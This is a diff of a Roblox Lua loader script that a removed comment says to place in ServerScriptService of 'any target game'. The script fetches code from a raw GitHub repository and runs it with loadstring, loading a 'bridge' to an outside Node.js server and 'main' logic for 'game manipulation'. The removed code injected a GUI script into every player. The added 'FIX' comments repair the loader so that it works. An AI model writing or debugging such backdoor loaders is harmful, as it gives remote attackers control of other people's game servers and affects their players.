@@ -1,14 +1,10 @@
 -- loader.lua
--- Shookenblook/Val-Privss
--- Put this as a Script in ServerScriptService of any target game
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
 
-local HttpService       = game:GetService("HttpService")
-local Players           = game:GetService("Players")
-local StarterGui        = game:GetService("StarterGui")
+-- FIX 1: Must use the 'raw' GitHub domain and point to the main branch
+local BASE = "https://raw.githubusercontent.com/Shookenblook/test-server-sided/main/"
 
-local BASE = "https://github.com/Shookenblook/test-server-sided"
-
--- Fetch a file from GitHub
 local function fetch(file)
     local ok, result = pcall(function()
         return HttpService:GetAsync(BASE .. file, true)
@@ -21,48 +17,33 @@ local function fetch(file)
     return result
 end
 
--- Run a server script
 local function runServer(file)
     local code = fetch(file)
     if not code then return false end
+    
     local fn, err = loadstring(code)
     if not fn then
         warn("[Loader] Compile error in " .. file .. ": " .. tostring(err))
         return false
     end
-    local ok, err2 = pcall(fn)
+    
+    -- Pass the Players service to the script in case it needs it
+    local ok, err2 = pcall(fn, Players) 
     if not ok then
         warn("[Loader] Runtime error in " .. file .. ": " .. tostring(err2))
         return false
     end
+    
     print("[Loader] Server script loaded: " .. file)
     return true
-end
-
--- Inject GUI LocalScript into a player
-local function injectGui(player)
-    task.wait(0.5)
-    local code = fetch("gui.lua")
-    if not code then return end
-
-    -- Remove old instance
-    local old = player.PlayerGui:FindFirstChild("own ss")
-    if old then old:Destroy() end
-
-    local ls = Instance.new("LocalScript")
-    ls.Name = "own ss loader"
-    ls.Source = code
-    ls.Parent = player:WaitForChild("PlayerGui")
-    print("[Loader] GUI injected into: " .. player.Name)
 end
 
 -- ============================================================
 -- BOOT
 -- ============================================================
-
 print("[Loader] Starting...")
 
--- 1. Load bridge first
+-- 1. Load Bridge (Connects to your local Node.js server)
 local bridgeOk = runServer("bridge.lua")
 if not bridgeOk then
     warn("[Loader] Bridge failed!")
@@ -70,14 +51,13 @@ end
 
 task.wait(0.5)
 
--- 2. Give GUI to players already in game
-for _, player in ipairs(Players:GetPlayers()) do
-    task.spawn(injectGui, player)
+-- 2. Load Main Logic (Handles Polaris functions and game manipulation)
+local mainOk = runServer("main.lua")
+if not mainOk then
+    warn("[Loader] Main logic failed!")
 end
 
--- 3. Give GUI to future players
-Players.PlayerAdded:Connect(function(player)
-    task.spawn(injectGui, player)
-end)
+-- FIX 2: GUI Injection removed because .Source is locked. 
+-- Your GUI should be cloned from your Roblox Model inside main.lua instead.
 
 print("[Loader] Done.")
